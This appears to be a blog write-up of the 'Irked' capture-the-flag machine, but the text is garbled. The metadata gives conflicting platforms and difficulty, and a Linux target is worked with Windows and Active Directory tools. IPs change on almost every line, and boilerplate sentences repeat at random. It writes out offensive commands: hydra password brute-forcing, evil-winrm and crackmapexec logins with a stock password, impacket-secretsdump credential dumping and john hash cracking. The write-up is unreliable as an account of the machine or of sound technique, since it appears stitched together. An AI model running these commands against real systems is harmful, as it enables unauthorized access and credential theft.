---
TitleSEO: "TryHackMe — Irked (Medium Linux) | ZureFX"
TitlePost: "TryHackMe — Irked (Medium Linux)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Irked. CSRF and Unconstrained Delegation to achieve medium compromise on Linux."
Keywords: "pwntilldawn, tryhackme, easy, reversing"
URL: "https://zurefx.github.io/writeups/htb-irked-657.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-irked-657/"
Date: "2025-04-11"
Tags: "PwnTillDawn, TryHackMe, Easy, Reversing"
Section: "writeups"
Lang: "en"
main_img: "htb-irked-657"
Permalink: "/writeups/htb-irked-657.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Irked** is rated **Medium** on TryHackMe. It runs **Linux** and the IP address during this analysis was `10.116.187.148`.

### Objectives

The application stored sensitive credentials in an unencrypted configuration file. The service was running without proper input validation, leading to injection vulnerabilities.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
evil-winrm -i 10.53.60.51 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
```

The database credentials were hardcoded in the application source code. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Service Enumeration

Authentication bypass was achieved through careful manipulation of the login mechanism. Token impersonation allowed elevation to SYSTEM privileges on the target. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.77.230.210 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.97.46.38 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.71.217.213 -u administrator -p 'P@ssw0rd!'
```

The service was running without proper input validation, leading to injection vulnerabilities. The service account had excessive permissions assigned in Active Directory.

### SMB Enumeration

The service was running without proper input validation, leading to injection vulnerabilities. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
evil-winrm -i 10.77.175.60 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.39.67.80 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.113.103.170/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p445,143,8080 10.80.107.232 -oN scan.txt
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Lateral movement was facilitated by reusing discovered credentials across services. The service was running without proper input validation, leading to injection vulnerabilities.

## Exploitation

### Vulnerability Identification

Post-exploitation enumeration revealed a path to domain administrator privileges. The scheduled task ran with elevated privileges and could be abused for escalation. The target system was identified as running a vulnerable version of the service.

Key finding: **CSRF**.

Lateral movement was facilitated by reusing discovered credentials across services. Group Policy Preferences contained encrypted but recoverable credentials.

### Initial Access

The backup files contained sensitive information that should not have been accessible. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
gobuster dir -u http://10.44.39.218/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.68.106.56 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p143,135,80 10.10.78.79 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.106.244.136/FUZZ
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Initial enumeration revealed several interesting open ports on the target. The target system was identified as running a vulnerable version of the service.

## Privilege Escalation

### Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. Lateral movement was facilitated by reusing discovered credentials across services. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.112.151.235
gobuster dir -u http://10.10.92.25/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.69.246.223/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Exploitation

Network traffic analysis revealed unencrypted communications containing user credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.104.24.115
evil-winrm -i 10.61.157.212 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Initial enumeration revealed several interesting open ports on the target. Unconstrained delegation was enabled on the compromised machine.

### Root/SYSTEM

Successfully obtained **root** access on the target.

Token impersonation allowed elevation to SYSTEM privileges on the target. Group Policy Preferences contained encrypted but recoverable credentials.

## Summary

### Tools Used

- `secretsdump`
- `nikto`
- `smbclient`
- `psexec`

### Key Takeaways

- CSRF
- Unconstrained Delegation
- CORS Misconfiguration
- LXD Privilege Escalation
